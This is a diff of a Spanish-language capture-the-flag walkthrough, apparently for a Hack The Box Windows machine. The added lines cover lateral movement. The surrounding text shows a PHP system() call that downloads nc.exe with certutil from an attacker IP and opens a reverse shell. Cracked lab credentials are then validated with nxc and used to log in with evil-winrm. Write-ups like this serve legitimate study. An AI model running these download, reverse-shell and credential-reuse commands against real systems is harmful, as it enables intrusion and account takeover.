@@ -322,7 +322,7 @@ Nos crearemos un archivo llamado `rce.php`
 system("certutil.exe -f -urlcache -split http://10.10.14.116/nc.exe C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe");
 ```
 
-Despues deberemos de modificar el archivo y añadirle el siguiente contenido
+Después deberemos de modificar el archivo y añadirle el siguiente contenido
 ```php
 system("C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -e cmd 10.10.14.116 443");
 ```
@@ -333,6 +333,9 @@ penelope -p 443
 ```
 
 Obteniendo una shell como yoshihide
+
+# Movimiento lateral
+
 Vamos a intentar conectarnos hora que estamos dentro a la base de datos anteriormente identificada
 Identificamos si existe `sqlcmd` para poder acceder a la base de datos
 ```shell
@@ -373,12 +376,21 @@ nikk37::get_dem_girls2@yahoo.com
 
 Las validaremos
 ```shell
+nxc smb 10.129.13.82 -u 'nikk37' -p 'get_dem_girls2@yahoo.com'
+```
 
+Obteniendo las credenciales como validas
+Verificamos si por algún casual es usuario pertenece a Remote Management Users
+```shell
+net user nikk37
+```
+
+Validamos que si que pertenece así que nos conectaremos
+```shell
+evil-winrm -i 10.129.13.82 -u 'nikk37' -p 'get_dem_girls2@yahoo.com'
 ```
 
 
-
-
-
+# Escalada de Privilegios
 
 
